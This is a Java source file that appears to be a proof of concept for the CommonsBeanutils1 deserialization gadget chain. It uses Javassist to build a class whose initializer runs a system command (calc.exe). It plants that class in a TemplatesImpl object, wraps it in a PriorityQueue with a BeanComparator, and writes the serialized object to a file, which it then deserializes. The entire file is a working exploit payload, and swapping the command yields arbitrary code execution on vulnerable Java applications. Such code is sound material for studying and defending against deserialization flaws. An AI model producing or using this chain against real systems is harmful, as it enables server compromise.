package gadget;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;
import util.ReflectionUtils;
import java.io.*;
import java.util.PriorityQueue;

public class CB1 {
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Squirt1e");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc.exe\");";
        cc.makeClassInitializer().insertBefore(cmd);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        cc.writeFile();
        byte[] classBytes = cc.toBytecode();
        byte[][] targetByteCodes = new byte[][]{classBytes};

        //补充实例化新建类所需的条件
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        ReflectionUtils.setFieldValue(templates, "_bytecodes", targetByteCodes);
        ReflectionUtils.setFieldValue(templates, "_name", "Squirt1e");

        final BeanComparator comparator = new BeanComparator();
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add(1);
        queue.add(1);

        ReflectionUtils.setFieldValue(comparator, "property", "outputProperties");

        ReflectionUtils.setFieldValue(queue, "queue", new Object[]{templates, templates});
        serialize(queue);
        unserialize();
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("CB1.bin"));
        objectOutputStream.writeObject(obj);
    }

    public static void unserialize() throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("CB1.bin"));
        objectInputStream.readObject();
    }

}
